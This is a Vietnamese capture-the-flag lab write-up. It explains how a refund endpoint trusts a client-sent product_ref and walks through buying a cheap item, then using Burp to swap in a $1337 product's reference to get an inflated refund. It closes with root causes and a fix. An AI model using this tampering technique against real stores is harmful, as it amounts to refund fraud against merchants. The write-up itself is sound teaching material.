# Solution - Refund Reference Tampering

## 1. Mô tả lỗ hổng

Lab có lỗi business logic trong endpoint refund.

Khi người dùng bấm `Request refund`, frontend gửi request JSON gồm:

```json
{
  "order_ref": "<random_order_reference>",
  "product_ref": "<random_product_reference>",
  "reason": "Payment issue"
}
```

Server có kiểm tra `order_ref` thuộc về user hiện tại, nhưng lại dùng `product_ref` từ request để tính số tiền hoàn.

Logic sai:

```text
refund_amount = price của product_ref do client gửi lên * quantity của order
```

Logic đúng phải là:

```text
refund_amount = amount của order gốc trong database
```

Vì vậy có thể mua một sản phẩm rẻ, sau đó sửa `product_ref` trong request refund thành mã của sản phẩm `$1337.00`. Sau 5 giây, hệ thống hoàn tiền theo giá `$1337.00` thay vì giá đơn hàng thật.

## 2. Chuẩn bị

Đăng nhập:

```text
user1 / user1
```

Wallet ban đầu:

```text
$100.00
```

Bật Burp Suite và cấu hình trình duyệt đi qua proxy của Burp.

## 3. Lấy product_ref của sản phẩm $1337.00

Vào trang chủ, mở sản phẩm:

```text
Lightweight "l33t" Leather Jacket - $1337.00
```

Trên trang chi tiết sẽ thấy:

```text
The flag will appear when this order is completed.
```

Dùng Burp để lấy chuỗi reference của sản phẩm này. Có thể lấy từ URL:

```http
GET /product/<target_product_ref>
```

Hoặc bấm `Add to cart` và bắt request:

```http
POST /cart/add

product_ref=<target_product_ref>&quantity=1
```

Ghi lại `target_product_ref` của sản phẩm `$1337.00`.

## 4. Lấy coupon 10%

Vào `My account`, hệ thống hiển thị coupon:

```text
BLACKBOX10
```

Coupon này giảm 10% khi đặt hàng. Đây không phải lỗi chính, nhưng giúp kiểm thử checkout/cart rõ hơn.

## 5. Mua một sản phẩm rẻ

Quay lại trang chủ và mua một sản phẩm trong khả năng wallet, ví dụ:

```text
Balance Beams - $16.11
```

Luồng thao tác:

```text
View details -> Quantity = 1 -> Add to cart -> Apply coupon BLACKBOX10 -> Place order
```

Request checkout là POST body, có thể quan sát bằng Burp:

```http
POST /checkout
Content-Type: application/x-www-form-urlencoded

product_ref=<cheap_product_ref>&quantity=1&coupon_code=BLACKBOX10&client_total_cents=1450
```

Server vẫn tự tính lại số tiền checkout. Sau khi đặt hàng, đơn mới có trạng thái:

```text
PAID
```

## 6. Bắt request refund bằng Burp

Vào `My account`, mở đơn vừa mua, bật Intercept trong Burp, sau đó bấm:

```text
Request refund
```

Request gốc sẽ có dạng:

```json
{
  "order_ref": "<cheap_order_ref>",
  "product_ref": "<cheap_product_ref>",
  "reason": "Payment issue"
}
```

## 7. Sửa product_ref

Giữ nguyên `order_ref` của đơn rẻ, chỉ sửa `product_ref` thành reference của sản phẩm `$1337.00` đã lấy ở bước 3:

```json
{
  "order_ref": "<cheap_order_ref>",
  "product_ref": "<target_product_ref>",
  "reason": "Payment issue"
}
```

Forward request.

Trang web sẽ hiển thị:

```text
Wait admin accept...
```

Chờ khoảng 5 giây.

## 8. Kết quả sau refund

Server hoàn tiền theo `product_ref` đã bị sửa:

```text
Refund amount: $1337.00
```

Thay vì hoàn theo giá đơn rẻ.

Wallet sau refund sẽ lớn hơn `$100.00` và đủ để mua sản phẩm target.

## 9. Lấy flag

Quay lại sản phẩm:

```text
Lightweight "l33t" Leather Jacket - $1337.00
```

Add to cart và checkout.

Vì wallet đã đủ, đơn hàng được hoàn tất và trang chi tiết đơn hàng hiển thị flag dạng:

```text
FLAG{...}
```

## 10. Nguyên nhân gốc

- Server tin `product_ref` từ client khi xử lý refund.
- Server không kiểm tra `product_ref` trong refund request có khớp với sản phẩm của đơn hàng gốc hay không.
- Server không giới hạn `refund_amount <= order.amount_cents`.
- Server không lấy refund amount từ snapshot đơn hàng trong database.
- Coupon/quantity làm luồng checkout thực tế hơn, nhưng lỗi chính nằm ở refund.

## 11. Cách vá

Endpoint refund chỉ nên nhận:

```json
{
  "order_ref": "<order_ref>",
  "reason": "Payment issue"
}
```

Khi xử lý, backend phải:

```text
1. Lấy order từ database bằng order_ref.
2. Kiểm tra order thuộc user hiện tại.
3. Kiểm tra trạng thái order hợp lệ để refund.
4. Tính refund_amount = order.amount_cents.
5. Không nhận product_ref hoặc refund_amount từ client.
6. Không cho tổng tiền refund vượt quá số tiền đã thanh toán.
7. Với coupon/quantity, refund phải dựa trên số tiền thật đã thanh toán sau giảm giá.
```
